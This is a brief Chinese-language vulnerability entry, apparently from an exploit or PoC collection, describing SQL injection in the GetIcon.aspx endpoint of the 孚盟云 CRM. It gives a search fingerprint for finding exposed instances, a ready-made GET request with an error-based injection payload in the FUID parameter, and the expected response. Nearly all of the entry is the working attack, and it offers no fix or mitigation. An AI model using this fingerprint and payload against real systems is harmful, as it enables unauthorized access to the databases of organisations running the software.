# 孚盟云GetIcon存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`GET /Common/GetIcon.aspx?FUID=-1%27and+1=@@VERSION-- HTTP/1.1`
- **响应特征**：200